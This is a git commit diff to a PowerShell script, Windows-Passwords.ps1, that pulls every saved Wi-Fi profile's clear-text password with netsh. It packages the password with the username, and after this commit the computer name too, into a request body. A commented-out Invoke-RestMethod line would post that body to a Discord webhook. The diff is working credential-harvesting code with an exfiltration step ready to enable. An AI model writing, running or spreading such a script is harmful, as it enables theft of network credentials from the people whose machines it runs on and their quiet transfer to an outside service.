32438a21b136ac5cb9127bb125c168dd699497ac
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-31 22:40:53 +0100

    Actualizar Windows-Passwords.ps1

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -3,10 +3,11 @@ netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s)
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+' 
 	$Body = @{
+'equipo' = $env:COMPUTERNAME
 		'username' = $env:username + " | " + [string]$wlan
 		'content' = [string]$passw
 	}
-Write-Output $username
+Write-Output $Body
 	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 }
 
